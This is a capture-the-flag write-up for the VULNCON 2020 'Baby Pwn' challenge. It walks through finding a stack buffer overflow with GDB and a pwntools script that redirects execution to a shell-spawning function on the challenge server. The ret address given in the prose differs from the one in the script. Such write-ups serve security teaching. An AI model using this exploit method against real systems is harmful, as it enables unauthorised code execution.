<h2 style="font-family: Raleway,RalewayOffline,sans-serif;font-weight: 500;letter-spacing: 2px;text-align:center;">Baby Pwn</h2>
<div style="text-align:center;">
	<span style="font-family: Lato,LatoOffline,sans-serif;">pwn</span>
	<span style="font-family: Lato,LatoOffline,sans-serif;">easy</span>
</div>


---

<h2 style="font-family: Raleway,RalewayOffline,sans-serif;font-weight: 500;letter-spacing: 2px;text-align:center;">Challenge</h2>

<div style="text-align:left;">
	<span style="font-family: Lato,LatoOffline,sans-serif;">
		<p>Do you even want description? This is too too too too too too Easy!!</p>
		<p><code>nc 35.232.11.215 49153</code></p>
		<p>File: <a href="./file/w4rmup">w4rmup</a></p>
		<p>Author - <code>_5h4rk_</code></p>
	</span>
</div>



---

<h2 style="font-family: Raleway,RalewayOffline,sans-serif;font-weight: 500;letter-spacing: 2px;text-align:center;">Solution</h2>

1. As hinted, use `netcat` to establish connection with the server.

   ```bash
   nc 35.232.11.215 49153
   ```

   Running the above command does not seem to yield anything.

   However, we found that if we hit `enter` a couple of times, a random number will be displayed.

   ```bash
   
   -1361098109
   
   
   ```

   Repeating the steps above displays a different number each time.

   

2. Now we run the file [w4rmup](./file/w4rmup)

   ```bash
./w4rmup
   ```

   Similarly, hitting `enter` a couple of times will also display a random number.
   
   ```bash

   -1885476349
   ```

   
   This indicates that the server at `35.232.11.215:49153` is also running the same program.
   
   
   
   However, when we entered a long string after running `./w4rmup`, we get a segmentation fault.
   
   ```bash
   ./w4rmup
   AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
   -561452541
   Segmentation fault (core dumped)
   ```


   This shows that there is a buffer overflow. We now have to check using `GDB` to see what is going on inside the file during execution.

   

3. Run `GDB` on [w4rmup](./file/w4rmup) 

   ```text
   gdb w4rmup
   ```

   Note: I have `pwndbg` and `gdb-peda` running at the same time so the output may look confusing.

   Output:

   ```text
   GNU gdb (Debian 10.1-1.4) 10.1
   Copyright (C) 2020 Free Software Foundation, Inc.
   License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
   This is free software: you are free to change and redistribute it.
   There is NO WARRANTY, to the extent permitted by law.
   Type "show copying" and "show warranty" for details.
   This GDB was configured as "x86_64-linux-gnu".
   Type "show configuration" for configuration details.
   For bug reporting instructions, please see:
   <https://www.gnu.org/software/gdb/bugs/>.
   Find the GDB manual and other documentation resources online at:
       <http://www.gnu.org/software/gdb/documentation/>.
   
   For help, type "help".
   Type "apropos word" to search for commands related to "word"...
   pwndbg: loaded 190 commands. Type pwndbg [filter] for a list.
   pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
   Reading symbols from w4rmup...
   (No debugging symbols found in w4rmup)
   gdb-peda$
   ```

   Then, we insert a break at main so that when we run we are able to enter the same string (i.e. `AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF`) that caused the segmentation fault.

   Output:

   ```bash
   gdb-peda$ r
   Starting program: /mnt/d/VULNCON_CTF_2020/Pwn/Baby Pwn/file/w4rmup
   gdb-peda$
   [----------------------------------registers-----------------------------------]
   RAX: 0x401162 --> 0x10ec8348e5894855
   RBX: 0x0
   RCX: 0x7fffff79e718 --> 0x7fffff7a0b00 --> 0x0
   RDX: 0x7ffffffedc58
   RSI: 0x7ffffffedc48
   RDI: 0x1
   RBP: 0x7ffffffedb50
   RSP: 0x7ffffffedb50
   RIP: 0x401166 --> 0xff058b4810ec8348
   R8 : 0x0
   R9 : 0x7fffff7d0180 --> 0x56415741e5894855
   R10: 0x5
   R11: 0x0
   R12: 0x401080 --> 0x89485ed18949ed31
   R13: 0x0
   R14: 0x0
   R15: 0x0
   EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
   [-------------------------------------code-------------------------------------]
      0x401160 <frame_dummy>:      jmp    0x4010f0 <register_tm_clones>
      0x401162 <main>:     push   rbp
      0x401163 <main+1>:   mov    rbp,rsp
   => 0x401166 <main+4>:   sub    rsp,0x10
      0x40116a <main+8>:   mov    rax,QWORD PTR [rip+0x2eff]        # 0x404070 <stdin@@GLIBC_2.2.5>
      0x401171 <main+15>:  mov    ecx,0x0
      0x401176 <main+20>:  mov    edx,0x2
      0x40117b <main+25>:  mov    esi,0x0
   [------------------------------------stack-------------------------------------]
   Invalid $SP address: 0x7ffffffedb50
   [------------------------------------------------------------------------------]
   Legend: code, data, rodata, value
   
   Breakpoint 1, 0x0000000000401166 in main ()
   ```

   ```bash
   c
   Continuing.
   AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
   ```

   `gdb-peda` output:

   ```bash
   -8787453
   
   Program received signal SIGSEGV, Segmentation fault.
   [----------------------------------registers-----------------------------------]
   RAX: 0x0
   RBX: 0x0
   RCX: 0x0
   RDX: 0x0
   RSI: 0x7ffffffeb4c0
   RDI: 0x7fffff7a1670 --> 0x0
   RBP: 0x4343434343434343 ('CCCCCCCC')
   RSP: 0x7ffffffedb58
   RIP: 0x4011fb --> 0x3d8d48e5894855c3
   R8 : 0x0
   R9 : 0x9 ('\t')
   R10: 0x7ffffffeb351
   R11: 0x7ffffffeb351
   R12: 0x401080 --> 0x89485ed18949ed31
   R13: 0x0
   R14: 0x0
   R15: 0x0
   EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
   [-------------------------------------code-------------------------------------]
      0x4011f0 <main+142>: call   0x401040 <printf@plt>
      0x4011f5 <main+147>: mov    eax,0x0
      0x4011fa <main+152>: leave
   => 0x4011fb <main+153>: ret
      0x4011fc <overflowed>:       push   rbp
      0x4011fd <overflowed+1>:     mov    rbp,rsp
      0x401200 <overflowed+4>:     lea    rdi,[rip+0xe01]        # 0x402008
      0x401207 <overflowed+11>:    call   0x401030 <system@plt>
   [------------------------------------stack-------------------------------------]
   Invalid $SP address: 0x7ffffffedb58
   [------------------------------------------------------------------------------]
   Legend: code, data, rodata, value
   ```

   `pwndbg` output:
   ```bash
   Stopped reason: SIGSEGV
   0x00000000004011fb in main ()
   LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
   ────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
   *RAX  0x0
    RBX  0x0
   *RCX  0x0
   *RDX  0x0
   *RDI  0x7fffff7a1670 (_IO_stdfile_1_lock) ◂— 0x0
   *RSI  0x7ffffffeb4c0 ◂— '-8787453\n'
    R8   0x0
   *R9   0x9
   *R10  0x7ffffffeb351 ◂— 0xfe00000000000000
   *R11  0x7ffffffeb351 ◂— 0xfe00000000000000
    R12  0x401080 (_start) ◂— xor    ebp, ebp /* 0x89485ed18949ed31 */
    R13  0x0
    R14  0x0
    R15  0x0
   *RBP  0x4343434343434343 ('CCCCCCCC')
   *RSP  0x7ffffffedb58 ◂— 'DDDDDDDDEEEEEEEEFFFFFFFF'
   *RIP  0x4011fb (main+153) ◂— ret     /* 0x3d8d48e5894855c3 */
   ──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
    ► 0x4011fb <main+153>    ret    <0x4444444444444444>
   
   
   
   
   
   
   
   
   
   
   ──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
   00:0000│ rsp  0x7ffffffedb58 ◂— 'DDDDDDDDEEEEEEEEFFFFFFFF'
   01:0008│      0x7ffffffedb60 ◂— 'EEEEEEEEFFFFFFFF'
   02:0010│      0x7ffffffedb68 ◂— 'FFFFFFFF'
   03:0018│      0x7ffffffedb70 —▸ 0x401100 (register_tm_clones+16) ◂— shr    esi, 0x3f /* 0x4803f8c1483feec1 */
   04:0020│      0x7ffffffedb78 —▸ 0x7fffff6067cf (init_cacheinfo+287) ◂— mov    rbp, rax
   05:0028│      0x7ffffffedb80 ◂— 0x0
   06:0030│      0x7ffffffedb88 ◂— 0x3a381067728d5dc9
   07:0038│      0x7ffffffedb90 —▸ 0x401080 (_start) ◂— xor    ebp, ebp /* 0x89485ed18949ed31 */
   ────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
    ► f 0           4011fb main+153
      f 1 4444444444444444
      f 2 4545454545454545
      f 3 4646464646464646
      f 4           401100 register_tm_clones+16
      f 5     7fffff6067cf init_cacheinfo+287
      f 6                0
   ──────────────────────────────────────────────────────────────────────────────────────────────────────
   gdb-peda$
   ```

   From the `gdb-peda` output above, we can see that the `RSP` has overflowed after 24 characters (i.e. stack starts to contain `DDDDDDDDEEEEEEEEFFFFFFFF`). This gives us the offset. We now need to know the return address. Also, there is a function called `overflowed`, this hints to use that this is the payload and that we should call the function after returning.

   To get a better idea:

   ![buffer_overflow](https://i.stack.imgur.com/wwP9I.png)

   

4. Use `gdb` to disassemble the function `overflowed`

   ```html
   gdb-peda$ disassemble overflowed
   ```

   Ouput:

   ```bash
      0x00000000004011fc <+0>:     push   rbp
      0x00000000004011fd <+1>:     mov    rbp,rsp
      0x0000000000401200 <+4>:     lea    rdi,[rip+0xe01]        # 0x402008
      0x0000000000401207 <+11>:    call   0x401030 <system@plt>
      0x000000000040120c <+16>:    nop
      0x000000000040120d <+17>:    pop    rbp
      0x000000000040120e <+18>:    ret
   End of assembler dump.
   ```

   From this we can determine the return address and also the base pointer of the payload (i.e. `push rbp`).

   payload `ret` address: `0x000000000040120e`

   payload `rbp` address: `0x00000000004011fc`

   

5. Using the information above, we can create a python script to send a payload to the server.

   We use `pwntools` (https://github.com/Gallopsled/pwntools) to create our script named [`payload.py`](./payload/payload.py).

   ```python
   from pwn import *
   
   target = remote('35.232.11.215', 49153)
   ret = 0x00000000004011fe
   rbp = 0x00000000004011fc
   payload = b'A'*24
   payload += p64(ret, endian='little')
   payload += p64(rbp, endian='little')
   
   target.send(payload)
   target.interactive()
   ```

   Note: `p64` is just a function that packs hex integers to bytes in little endian (https://docs.pwntools.com/en/stable/util/packing.html).

   

6. We now just run the python script.

   ```bash
    python3 payload.py
   ```

   Output:

   ```bash
   [+] Opening connection to 35.232.11.215 on port 49153: Done
   [*] Switching to interactive mode
   [*] Got EOF while reading in interactive
   $  
   ```

   We have now entered the shell. All that is left to do is to find the flag

   

   

7. Search the flag we can do a simple `ls` 
   
   ```bash
   $ ls
-2081346941
   $ ls
   check
   flag
   run.sh
   ynetd
   ```
   
   Now we find the `flag` file,  we can just display its contents:
   
   ```bash
   cat flag
   ```
   
   Output:
   
   ```bash
   vulncon{y0u_4re_all_s3t_for_pwn}
   ```
   
   
